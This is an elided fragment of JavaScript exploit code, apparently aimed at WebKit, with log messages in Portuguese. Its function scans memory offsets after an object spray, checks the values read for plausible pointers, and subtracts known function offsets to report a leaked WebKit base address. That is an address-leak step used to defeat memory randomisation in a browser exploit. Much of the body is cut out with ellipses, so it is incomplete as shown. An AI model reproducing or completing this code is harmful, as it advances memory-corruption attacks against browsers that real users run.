...
export async function sprayAndInvestigateObjectExposure() {
    ...
    try {
        ...
        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP) {
            ...
            const isBadRead = (potential_ptr_qword === null) ||
            ...
            const isZeroPtr = isAdvancedInt64Object(potential_ptr_qword) && potential_ptr_qword.low() === 0 && potential_ptr_qword.high() === 0;

            if (potential_ptr_qword && !isZeroPtr && !isBadRead) {
                if (isAdvancedInt64Object(potential_ptr_qword) && potential_ptr_qword.high() > 0x1000 && potential_ptr_qword.high() < 0x7FFF && (potential_ptr_qword.low() & 0x7) === 0) {
                    ...
                    for (const funcName in functionOffsets) {
                        ...
                        try {
                            ...
                            if ((potential_base_addr.low() & 0xFFF) === 0 && potential_base_addr.high() > 0x1000 && !(potential_base_addr.high() === 0 && potential_base_addr.low() === 0) ) {
                                logS3(`    !!!! VAZAMENTO DE BASE DO WEBKIT POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
                                logS3(`      Ponteiro vazado (de ${toHex(offset)} via cópia de ${toHex(offset)}): ${potential_ptr_qword.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
